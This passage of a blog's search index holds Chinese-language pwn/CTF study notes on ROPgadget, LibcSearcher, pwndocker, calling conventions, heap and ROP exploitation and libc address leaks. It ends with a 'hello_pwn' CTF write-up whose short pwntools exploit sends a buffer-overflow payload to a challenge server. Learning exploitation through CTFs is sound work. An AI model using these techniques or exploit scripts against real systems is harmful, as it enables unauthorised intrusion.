[--noinstr]</span><br><span class="line">                    [--dump]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message <span class="keyword">and</span> exit</span><br><span class="line">    -v, --version        Display the ROPgadget<span class="string">'s version</span></span><br><span class="line"><span class="string">    -c, --checkUpdate    Checks if a new version is available</span></span><br><span class="line"><span class="string">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span></span><br><span class="line"><span class="string">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span></span><br><span class="line"><span class="string">    --string &lt;string&gt;    Search string in readable segment</span></span><br><span class="line"><span class="string">    --memstr &lt;string&gt;    Search each byte in all readable segment</span></span><br><span class="line"><span class="string">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span></span><br><span class="line"><span class="string">    --only &lt;key&gt;         Only show specific instructions</span></span><br><span class="line"><span class="string">    --filter &lt;key&gt;       Suppress specific instructions</span></span><br><span class="line"><span class="string">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span></span><br><span class="line"><span class="string">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget'</span>s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">    --ropchain           <span class="builtin-name">Enable</span> the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive<span class="built_in"> console </span><span class="keyword">for</span> search engine</span><br><span class="line">    --norop              <span class="builtin-name">Disable</span> ROP search engine</span><br><span class="line">    --nojop              <span class="builtin-name">Disable</span> JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              <span class="builtin-name">Disable</span> SYS search engine</span><br><span class="line">    --multibr            <span class="builtin-name">Enable</span> multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            <span class="builtin-name">Disable</span> the gadget instructions<span class="built_in"> console </span>printing</span><br><span class="line">    --dump   Outputs the gadget bytes [LibcSearche]</span><br></pre></td></tr></table></figure><h2 id="用来寻找libc-版本的工具"><a href="#用来寻找libc-版本的工具" class="headerlink" title="用来寻找libc 版本的工具"></a><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">用来寻找libc 版本的工具</a></h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第二个参数，为已泄露的实际地址,或最后<span class="number">12</span>位(比如：d90)，int类型</span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">"__libc_start_main_ret"</span>)</span><br></pre></td></tr></table></figure><h2 id="pwndocker"><a href="#pwndocker" class="headerlink" title="pwndocker"></a><a href="https://github.com/0xTac/Pwndocker" target="_blank" rel="noopener">pwndocker</a></h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>TacXingXing/Pwndocker</span><br><span class="line">cd Pwndocker</span><br><span class="line">docker build -t pwndocker .</span><br><span class="line">docker run -it -v -v <span class="variable">$(</span>pwd)/<span class="variable">$&#123;</span>ctf_name&#125;<span class="symbol">:/ctf/work</span> -p <span class="number">23946:23946</span> --privileged --cap-add=SYS_PRTACE pwndocker</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">included software</span><br><span class="line">pwntools —— CTF framework <span class="keyword">and</span> exploit development library</span><br><span class="line">pwndbg —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers,<span class="built_in"> hardware </span>hackers, reverse-engineers <span class="keyword">and</span> exploit developers</span><br><span class="line">pwngdb —— gdb <span class="keyword">for</span> pwn</span><br><span class="line">ROPgadget —— facilitate ROP exploitation tool</span><br><span class="line">roputils —— A Return-oriented Programming toolkit</span><br><span class="line">one_gadget —— A searching one-gadget of execve(<span class="string">'/bin/sh'</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)<span class="built_in"> tool </span><span class="keyword">for</span> amd64 <span class="keyword">and</span> i386</span><br><span class="line">angr —— A platform-agnostic binary analysis framework</span><br><span class="line">radare2 —— A rewrite <span class="keyword">from</span> scratch of radare <span class="keyword">in</span> order <span class="keyword">to</span> provide a <span class="builtin-name">set</span> of libraries <span class="keyword">and</span> tools <span class="keyword">to</span> work with binary files</span><br><span class="line">welpwn —— designed <span class="keyword">to</span> make pwnning an art, freeing you <span class="keyword">from</span> dozens of meaningless jobs.</span><br><span class="line">linux_server[64] —— IDA 7.0 <span class="builtin-name">debug</span><span class="built_in"> server </span><span class="keyword">for</span> linux</span><br><span class="line">tmux —— a terminal multiplexer</span><br><span class="line">ltrace —— trace library function call</span><br><span class="line">strace —— trace<span class="built_in"> system </span>call</span><br><span class="line">added softwares</span><br><span class="line">zsh &amp;&amp; oh-my-zsh -- A delightful community-driven (with 1,300+ contributors) framework <span class="keyword">for</span> managing your zsh configuration.</span><br><span class="line">peda -- Python Exploit Development Assistance <span class="keyword">for</span> GDB</span><br><span class="line">socat -- A relay <span class="keyword">for</span> bidirectional data transfer between two independent data channels.</span><br><span class="line">z3 -- Theorem Prover</span><br><span class="line">seccomp-tools -- Provide powerful tools <span class="keyword">for</span> seccomp analysis</span><br><span class="line">qemu -- QEMU is a generic <span class="keyword">and</span> open source machine emulator <span class="keyword">and</span> virtualizer. .gdbinit .zshrc .tmux.conf</span><br></pre></td></tr></table></figure><p><img src="/images/pwn/image-20200317174124303.png" alt="image-20200317174124303"></p><h2 id="x64与x86架构函数原理"><a href="#x64与x86架构函数原理" class="headerlink" title="x64与x86架构函数原理"></a>x64与x86架构函数原理</h2><h3 id="对齐约定"><a href="#对齐约定" class="headerlink" title="对齐约定"></a>对齐约定</h3><pre><code>x64的调用约定中，大部分情况下默认是16字节对齐的，gcc编译时分配数组是也会进行16字节对齐但是栈溢出后我们破坏掉了这个对齐，导致了这个错误 x64之rop:  开始的位置由数据填充构成 ;   通过所给的libc.so文件计算函数之间的偏移地址, 即地址差, 从而得到需要覆盖的字节数,</code></pre><h3 id="函数调用约定-c-c"><a href="#函数调用约定-c-c" class="headerlink" title="  函数调用约定(c/c++):"></a><a href="https://blog.csdn.net/hellokandy/article/details/54603055" target="_blank" rel="noopener">  函数调用约定(c/c++)</a>:</h3><pre><code>VC中默认调用是 __cdecl 方式，Windows API 使用 __stdcall 调用方式，在 DLL 导出函数中，为了跟 Windows API 保持一致，建议使用 __stdcall 方式。</code></pre><h4 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h4><pre><code>__stdcall 是 StandardCall 的缩写，是C++的标准调用方式。stdcall 调用方式又被称为 Pascal 调用方式。在Microsoft C++系列的C/C++编译器中，使用 PASCAL 宏，WINAPI 宏和 CALLBACK 宏来指定函数的调用方式为 stdcall。其声明语法为：int _stdcall function(int a, int b);stdcall的调用方式意味着：（1）参数从右向左依次压入堆栈.（2）由被调用函数自己来恢复堆栈，称为自动清栈。（3）函数名自动加前导下划线，后面紧跟着一个@，其后紧跟着参数的大小。</code></pre><h4 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h4><pre><code>__cdecl 是C Declaration的缩写（declaration，声明），cdecl调用方式又称为C调用方式，是C语言缺省的调用方式。其声明语法为：int function(int a, int b) // 不加修饰符就是C调用方式int _cdecl function(int a, int b) // 明确指定用C调用方式 cdecl的调用方式意味着：（1）参数从右向左依次压入堆栈.（2）由调用者恢复堆栈，称为手动清栈。（3）函数名自动加前导下划线。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a><strong>fastcall</strong></h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastcall 按照名字上理解就可以知道，它是一种快速调用方式，因为它通过 <span class="meta">CPU</span> 寄存器来传递参数。</span><br><span class="line">此方式的函数的第一个和第二个<span class="built_in">DWORD</span>参数通过<span class="built_in">ecx</span>和<span class="built_in">edx</span>传递，后面的参数从右向左的顺序压入栈。被调用函数清理堆栈。</span><br><span class="line">其声明语法为：</span><br><span class="line"><span class="keyword">int</span> fastcall function(<span class="keyword">int</span> a, <span class="keyword">int</span> b)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thiscall 调用方式是唯一一种不能显示指定的修饰符。它是C++类成员函数缺省的调用方式。由于成员函数调用还有一个<span class="keyword">this</span>指针，因此必须用这种特殊的调用方式。</span><br><span class="line">thiscall调用方式意味着：（<span class="number">1</span>）参数从右向左压入栈。</span><br><span class="line">（<span class="number">2</span>）如果参数个数确定，<span class="keyword">this</span>指针通过ecx传递给被调用者；如果参数个数不确定，<span class="keyword">this</span>指针在所有参数压入栈后被压入栈。</span><br><span class="line">参数个数不定的，由调用者清理堆栈，否则由函数自己清理堆栈。可以看到，对于参数个数固定的情况，它类似于stdcall，不定时则类似于cdecl。 fastcall</span><br></pre></td></tr></table></figure><h4 id="naked-call"><a href="#naked-call" class="headerlink" title="naked call"></a>naked call</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是一种比较少见的调用方式，一般高级程序设计语言中不常见。</span><br><span class="line">函数的声明调用方式和实际调用方式必须一致，否则编译器会产生混乱。</span><br></pre></td></tr></table></figure><h2 id="漏洞利用技术与技巧"><a href="#漏洞利用技术与技巧" class="headerlink" title="漏洞利用技术与技巧"></a>漏洞利用技术与技巧</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Overflow <span class="keyword">directly </span> :</span><br><span class="line"></span><br><span class="line">​溢出相邻堆块内存的内容 例题: XMAN2016 fengshui(zijinghua pwn)</span><br><span class="line">SSC 安全大会 heapcanary </span><br><span class="line"></span><br><span class="line">作业:   heapcananry</span><br><span class="line"></span><br><span class="line">Fast <span class="keyword">bin </span>(维护单向链表)attack:</span><br><span class="line"></span><br><span class="line">​作业 : alictf <span class="number">2016</span> </span><br><span class="line"></span><br><span class="line">Unsorted <span class="keyword">bin </span>(双向链表)attack  </span><br><span class="line"></span><br><span class="line">Overwrite Topchunk</span><br><span class="line"></span><br><span class="line"><span class="keyword">bctf </span><span class="number">2016</span>   <span class="keyword">bcloud</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Cassical </span>&amp; Modem Unlink Attack</span><br><span class="line"></span><br><span class="line">​当free调用时, 如果与mem相邻的块时空闲的, 则会将其从空闲链表中拿(unlink) 下来并与mem合并..      </span><br><span class="line">​<span class="comment">#cefin unlink(P,BK,  GD)&#123;</span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">BK </span>= P -&gt; <span class="keyword">bk;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">​</span>FD = P- &gt; fd;</span><br><span class="line"></span><br><span class="line">​FD -&gt; <span class="keyword">bk </span>= <span class="keyword">BK; </span>   </span><br><span class="line"></span><br><span class="line">​<span class="keyword">BK </span> -&gt; fd = FD;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作业 :  Hitcon <span class="number">2014</span> qualifier stkof (Modern Unlink Attack) PlaidCTF <span class="number">2014</span></span><br><span class="line"></span><br><span class="line">Off <span class="keyword">bu </span>one &amp; Off <span class="keyword">by </span>null </span><br><span class="line"></span><br><span class="line">Other techniques</span><br><span class="line"></span><br><span class="line"><span class="comment">##### General exploit techiques</span></span><br><span class="line"></span><br><span class="line">heap fengshui </span><br><span class="line"></span><br><span class="line">heap spray </span><br><span class="line"></span><br><span class="line">Exploit mmap chunk   \</span><br><span class="line"></span><br><span class="line"><span class="comment">##### use after gfreee / double free</span></span><br></pre></td></tr></table></figure><h2 id="chanry-绕过"><a href="#chanry-绕过" class="headerlink" title="chanry 绕过"></a>chanry 绕过</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">习题<span class="selector-tag">shitsco</span></span><br><span class="line">攻击手段与技术分析</span><br><span class="line">三道题花式绕过<span class="selector-tag">Canary</span></span><br><span class="line">攻防世界<span class="selector-pseudo">:babystack</span>:</span><br></pre></td></tr></table></figure><h3 id="涉及工具使用"><a href="#涉及工具使用" class="headerlink" title="涉及工具使用"></a>涉及工具使用</h3><pre><code>one_gdaget ./filenameretn 相当于 pop r    python2写payload 需要加上: # -*- coding: UTF-8 -*-  使文件成为utf-8格式                          python2默认采用ascii编码gdb-peda:pattern create 150  可以创造150个字符</code></pre><h2 id="rop利用链"><a href="#rop利用链" class="headerlink" title="rop利用链"></a><a href="https://xz.aliyun.com/t/3402" target="_blank" rel="noopener">rop利用链</a></h2><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  rop的实现原理</span><br><span class="line"> 利用程序本身所有的指令实现绕过<span class="type">NX</span>保护,执行自己想要的system(<span class="string">"/bin/bash"</span>)</span><br><span class="line"> 也可从程序当中找到可利用的子函数,从 libc 中使用函数，需要知道 libc 的基地址。</span><br><span class="line"> 通常得到 libc 基地址思路就是：</span><br><span class="line">libc 函数的真实地址 =&gt; 由于给了 libc.so 文件知道相对偏移地址 =&gt; libc 基地址</span><br><span class="line"> =&gt; 其他任何 libc 函数真实地址   (基地址+偏移地址 = 真实地址)</span><br><span class="line"> <span class="type">A</span>真实地址-<span class="type">A</span>的偏移地址 = <span class="type">B</span>真实地址 - <span class="type">B</span>偏移地址 = 基地址</span><br><span class="line"></span><br><span class="line"> 获得<span class="type">B</span>得地址:</span><br><span class="line">  基于libc延迟绑定机制,我们需要选择已经执行过的函数来泄露 ,需要选择函数的plt地址,</span><br><span class="line">  找到jmp指向的哪个地址才是我们需要泄露的  </span><br><span class="line"> &lt;-- 例:</span><br><span class="line"> 比如通过puts函数泄露</span><br><span class="line"> elf = <span class="type">ELF</span>(<span class="string">"libc文件"</span>)</span><br><span class="line"> puts_plt = elf.pl[<span class="symbol">'puts</span>]</span><br><span class="line"> main_plt = elf.symbols[<span class="symbol">'_start'</span>]</span><br><span class="line"> puts_got = elf.got[<span class="symbol">'puts'</span>]</span><br><span class="line"> --&gt;      <span class="type">DynELFleak</span>技术   也即漏出技术  从漏出地址最后<span class="number">12</span>位</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">参考GOT表与PLT表知识详解</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 三个重要问题:</span><br><span class="line">怎么去搜索这样的 gadget_addr，当然不止一次 pop，还可以多个 pop 加 ret 组合等等，</span><br><span class="line">看你希望怎么去利用</span><br><span class="line">如何得到 <span class="string">'/bin/sh\0'</span> 这样的字符串，通常程序没有这样的字符串</span><br><span class="line">如何得到 libc 中<span class="built_in"> system </span>实际运行的地址（libc 的基地址+system 在 libc 中的偏移地址）</span><br><span class="line"></span><br><span class="line">其实还有一个问题很重要，就是确定你的返回地址 return_addr 前面缓冲区到底有多大，</span><br><span class="line">这样才能准确的实现缓冲区溢出覆盖。做法有二种：一是直接从 IDA 的 F5 源码和汇编计算得到；</span><br><span class="line">二是使用 GDB 动态调试一下</span><br></pre></td></tr></table></figure><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">asm</span><span class="params">(shellcraft.sh()</span></span>)  /bin/bash 汇编代码</span><br><span class="line">   设置架构格式</span><br><span class="line">pwntools   asm(shellcraft.sh)取得在设置架构下的/bin/bash 汇编代码</span><br></pre></td></tr></table></figure><p>from pwn import  *</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DynELF时<span class="number">1</span>pwntools中专门用来应对无libc情况的漏洞利用模块</span><br><span class="line">其中也可通过函数泄露所执行文件中函数地址，通过函数后<span class="number">12</span>位找到libc文件版本，然后通过偏移找到sh(system ‘ bin/bash)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())  /bin/bash 汇编代码</span><br><span class="line">设置架构格式</span><br><span class="line">pwntools   asm(shellcraft.sh)取得在设置架构下的/bin/bash 汇编代码</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#DyELF模块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">payload</span><br><span class="line"></span><br><span class="line">对DynELF(leak,elf=ELF(<span class="string">'./file'</span>)  </span><br><span class="line">无</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="漏洞程序编写"><a href="#漏洞程序编写" class="headerlink" title="漏洞程序编写:"></a>漏洞程序编写:</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写出code后使用工具提取shellcode机器码,在漏洞区域实现shellcode覆盖</span><br><span class="line">通过ue实现汇编代码转换为<span class="number">16</span>进制    the exe shellcode</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 yourname.c -o debugfunc32</span><br></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">##### 溢出位数不够: 覆盖ebp, Partial  Ovewrite</span><br><span class="line"></span><br><span class="line">使用C32asm获取动态链接库的API函数地址 , 工具属于吾爱破解工具包</span><br></pre></td></tr></table></figure><pre><code> 对栈内数据：遵从从右到左压栈原则  ， 从下到上执行代码call 语句下的语句地址通常被称为返回地址利用溢出覆盖返回地址执行shellcoderor  循环移位</code></pre><h3 id="shellcode代码实现"><a href="#shellcode代码实现" class="headerlink" title="shellcode代码实现"></a>shellcode代码实现</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">leak泄露地址：</span><br><span class="line">puts 函数处理</span><br><span class="line">输出长度不可控</span><br><span class="line">在遇到 \n(<span class="number">0x0a</span>) 继续输出</span><br><span class="line">在遇到 \<span class="number">0</span>(<span class="number">0x00</span>) 结束输出</span><br><span class="line">并且会在输出的最后添加 \n(<span class="number">0x0a</span>)</span><br><span class="line">plt段内函数地址并不是调用后的函数地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symbols[’function<span class="string">'] libc 文件内函数偏移量</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf_hello_pwn</title>
      <link href="pwn/hello_pwn/hello_pwn/"/>
      <url>pwn/hello_pwn/hello_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-new-pwn"><a href="#xctf-new-pwn" class="headerlink" title="xctf new pwn"></a>xctf new pwn</h1><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h2><a id="more"></a><p>file </p><p><img src="/images/hello_pwn/image-20200311001353144.png" alt="image-20200311001353144"></p><p>IDa:</p><p><img src="/images/hello_pwn/image-20200311002100438.png" alt="image-20200311002100438"></p><p>offect_distance:</p><p><img src="/images/hello_pwn/image-20200311002116258.png" alt="image-20200311002116258"></p><p>0x4h </p><p>so ,payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">payload</span> = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'59610'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">#r.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weclome to pOne&#39;s  blog</title>
      <link href="Weclome-to-pOne-s-blog/"/>
      <url>Weclome-to-pOne-s-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Weclome-to-my-blog"><a href="#Weclome-to-my-blog" class="headerlink" title="Weclome to my blog"></a>Weclome to my blog</h1><p>this is my first blog’s index    </p><a id="more"></a><h2 id="something-about-web"><a href="#something-about-web" class="headerlink" title="something about web"></a>something about web</h2><p>​    there mang knowledge in my learing way, i hope i can still do my job. i knwo you can do</p><p> do  never <strong>give up</strong>, i believe, my boy !!!</p><h3 id="text-title"><a href="#text-title" class="headerlink" title="text title"></a>text title</h3><p><a href="/pwn/index">pwn</a></p><!--this page will be changed from time to time-->  ]]></content>
      
      
      
        <tags>
            
            <tag> index </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
